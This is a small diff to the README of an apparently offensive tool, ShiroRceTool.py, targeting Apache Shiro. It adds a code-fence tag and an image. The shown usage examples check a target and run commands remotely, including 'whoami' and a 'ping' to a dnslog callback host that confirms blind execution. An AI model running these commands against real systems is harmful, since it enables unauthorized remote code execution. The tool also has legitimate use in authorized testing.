@@ -34,7 +34,7 @@ optional arguments:
 
 ## 示例 Example
 
-```
+```bash
 # Check
 python ShiroRceTool.py -m check -u "http://example.com"
 # Exec cmd with echo
@@ -42,4 +42,4 @@ python ShiroRceTool.py -m exploit -u "http://example.com" -c "whoami" -e
 # Exec cmd with no echo
 python ShiroRceTool.py -m exploit -u "http://example.com" -c "ping dnslog.example.com"
 ```
-
+![](img/img2.png)
